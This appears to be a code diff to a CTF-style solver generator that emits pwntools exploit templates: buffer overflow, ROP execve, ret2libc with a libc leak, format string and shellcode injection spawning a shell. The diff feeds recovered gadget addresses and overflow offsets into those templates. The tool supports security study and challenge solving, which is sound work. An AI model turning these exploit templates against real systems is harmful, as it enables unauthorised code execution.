@@ -33,7 +33,18 @@ def _common(path: str) -> str:
     return f"import sys\nimport subprocess\nBINARY = {path!r}\n\n"
 
 
-def _angr_find(path: str, bits: int, arch: str = "") -> str:
+def _offset_line(overflow_offset: int | None) -> str:
+    """``OFFSET`` assignment line: a real padding value recovered from
+    ``analysis.overflow_sites``, or a documented fallback that still needs
+    confirming against the real binary before running."""
+    if overflow_offset is not None:
+        return f"OFFSET  = {overflow_offset}  # recovered from analysis.overflow_sites()\n"
+    return "OFFSET  = 64  # fallback guess - verify with a De Bruijn/cyclic pattern before running\n"
+
+
+def _angr_find(
+    path: str, bits: int, arch: str = "", pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
     return (
         f"{_common(path)}"
         f"import angr\n"
@@ -49,7 +60,9 @@ def _angr_find(path: str, bits: int, arch: str = "") -> str:
     )
 
 
-def _z3_constraint(path: str, bits: int, arch: str = "") -> str:
+def _z3_constraint(
+    path: str, bits: int, arch: str = "", pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
     return (
         f"{_common(path)}"
         f"import z3\n\n"
@@ -180,11 +193,15 @@ else:
 '''
 
 
-def _static_reconstruct(path: str, bits: int, arch: str) -> str:
+def _static_reconstruct(
+    path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
     return _common(path) + _STATIC_RECONSTRUCT_BODY.replace("__BITS__", str(bits))
 
 
-def _overflow_exploit(path: str, bits: int, arch: str) -> str:
+def _overflow_exploit(
+    path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
     return (
         f"{_common(path)}"
         f"from pwn import *\n\n"
@@ -197,7 +214,7 @@ def _overflow_exploit(path: str, bits: int, arch: str) -> str:
     )
 
 
-def _rop_execve(path: str, bits: int, arch: str) -> str:
+def _rop_execve(path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None) -> str:
     return (
         f"{_common(path)}"
         f"from pwn import *\n\n"
@@ -211,7 +228,9 @@ def _rop_execve(path: str, bits: int, arch: str) -> str:
     )
 
 
-def _format_string(path: str, bits: int, arch: str) -> str:
+def _format_string(
+    path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
     return (
         f"{_common(path)}"
         f"from pwn import *\n\n"
@@ -222,7 +241,17 @@ def _format_string(path: str, bits: int, arch: str) -> str:
     )
 
 
-def _ret2libc(path: str, bits: int, arch: str) -> str:
+def _ret2libc(path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None) -> str:
+    if pop_rdi is not None:
+        pop_rdi_block = f"POP_RDI = {hex(pop_rdi)}  # recovered by ROPEngine.scan()\n"
+    else:
+        pop_rdi_block = (
+            "rop = ROP(elf)\n"
+            "try:\n"
+            '    POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]\n'
+            "except (IndexError, TypeError):\n"
+            '    raise SystemExit("pop rdi; ret gadget not found - supply POP_RDI manually")\n'
+        )
     return (
         f"{_common(path)}"
         f"from pwn import *\n\n"
@@ -230,9 +259,9 @@ def _ret2libc(path: str, bits: int, arch: str) -> str:
         f'libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)\n'
         f'# libc = ELF("./libc.so.6", checksec=False)  # use if provided\n'
         f'context.log_level = "info"\n\n'
-        f'POP_RDI = 0x0  # TODO: search gadgets, e.g. rop.find_gadget(["pop rdi", "ret"])\n'
+        f"{pop_rdi_block}"
         f"RET     = 0x0\n"
-        f"OFFSET  = 64  # TODO: cyclic_find\n\n"
+        f"{_offset_line(overflow_offset)}\n"
         f"def conn():\n"
         f'    return remote("target", 1337) if args.REMOTE else process(elf.path)\n\n'
         f"def stage1_leak(io):\n"
@@ -261,7 +290,9 @@ def _ret2libc(path: str, bits: int, arch: str) -> str:
     )
 
 
-def _shellcode_exploit(path: str, bits: int, arch: str) -> str:
+def _shellcode_exploit(
+    path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
     return (
         f"{_common(path)}"
         f"from pwn import *\n\n"
@@ -271,7 +302,8 @@ def _shellcode_exploit(path: str, bits: int, arch: str) -> str:
         f'context.log_level = "info"\n\n'
         f"sc = asm(shellcraft.sh())\n"
         f'log.info(f"shellcode {{len(sc)}} bytes")\n'
-        f"OFFSET = 64  # TODO: cyclic_find\n\n"
+        f"{_offset_line(overflow_offset)}"
+        f"BUF_ADDR = 0xdeadbeef  # leaked stack-buffer address for the payload - cannot be known statically (ASLR)\n\n"
         f"def conn():\n"
         f'    return remote("target", 1337) if args.REMOTE else process(elf.path)\n\n'
         f"def exploit():\n"
@@ -279,14 +311,16 @@ def _shellcode_exploit(path: str, bits: int, arch: str) -> str:
         f'    io.recvuntil(b"> ", timeout=2)\n'
         f'    nop  = b"\\\\x90" * max(0, OFFSET - len(sc))\n'
         f'    payload = nop + sc + b"A" * max(0, OFFSET - len(nop) - len(sc))\n'
-        f"    payload += p64(0xdeadbeef)  # TODO: replace with leaked buf addr\n"
+        f"    payload += p64(BUF_ADDR)\n"
         f"    io.sendline(payload)\n"
         f"    io.interactive()\n\n"
         f"exploit()\n"
     )
 
 
-def _triton_solve_flag(path: str, bits: int, arch: str) -> str:
+def _triton_solve_flag(
+    path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
     """Concolic solve: emulate the checker one instruction at a time with a
     symbolic input buffer, then ask the SMT backend for input that keeps every
     taken branch on the 'good' path. No process is spawned — pure emulation."""
@@ -346,7 +380,9 @@ def _triton_solve_flag(path: str, bits: int, arch: str) -> str:
     )
 
 
-def _unicorn_emulate_func(path: str, bits: int, arch: str) -> str:
+def _unicorn_emulate_func(
+    path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
     """Concretely emulate one function (e.g. a decrypt / deobfuscation routine)
     with controlled arguments and dump its return value + an output region."""
     return (
@@ -357,7 +393,9 @@ def _unicorn_emulate_func(path: str, bits: int, arch: str) -> str:
         f"FUNC_ADDR = 0x0        # function to run (from the Functions tab)\n"
         f"ARG1 = 0x600000        # e.g. pointer to an input/output buffer you allocate below\n"
         f"ARG2 = 0               # second arg (length, key, ...)\n"
-        f"OUT_ADDR, OUT_LEN = ARG1, 64\n\n"
+        f"OUT_ADDR, OUT_LEN = ARG1, 64\n"
+        f'INPUT_BYTES = b"INPUT-GOES-HERE\\x00"  # bytes written to ARG1 before emulation\n'
+        f"                        # set to the target function's real expected input\n\n"
         f"BITS = {bits}\n"
         f"uc = Uc(UC_ARCH_X86, UC_MODE_64 if BITS == 64 else UC_MODE_32)\n\n"
         f"bin_ = lief.parse(BINARY)\n"
@@ -373,7 +411,7 @@ def _unicorn_emulate_func(path: str, bits: int, arch: str) -> str:
         f"STACK = 0x7f000000; uc.mem_map(STACK - 0x100000, 0x200000)\n"
         f"sp = STACK\n"
         f"uc.mem_map(0x600000, 0x10000)              # scratch buffer region\n"
-        f'uc.mem_write(ARG1, b"INPUT-GOES-HERE\\x00")   # TODO: real input bytes\n\n'
+        f"uc.mem_write(ARG1, INPUT_BYTES)\n\n"
         f"RET_MAGIC = 0x1337000\n"
         f"if BITS == 64:\n"
         f"    uc.reg_write(UC_X86_REG_RSP, sp); uc.reg_write(UC_X86_REG_RBP, sp)\n"
@@ -409,12 +447,25 @@ SOLVER_GENERATORS = {
 }
 
 
-def generate_solver(solver_type: str, path: str, arch: str, bits: int) -> str:
-    """Generate solver script source code for the given type."""
+def generate_solver(
+    solver_type: str,
+    path: str,
+    arch: str,
+    bits: int,
+    *,
+    pop_rdi: int | None = None,
+    overflow_offset: int | None = None,
+) -> str:
+    """Generate solver script source code for the given type.
+
+    ``pop_rdi``/``overflow_offset`` are real values recovered from the loaded
+    binary (``analysis.scan_gadgets``/``analysis.overflow_sites``); templates
+    that use them fall back to a documented placeholder when omitted.
+    """
     gen = SOLVER_GENERATORS.get(solver_type)
     if gen is None:
         raise ValueError(f"Unknown solver type: {solver_type}")
-    return gen(path, bits, arch)
+    return gen(path, bits, arch, pop_rdi, overflow_offset)
 
 
 def get_solver_list() -> list:
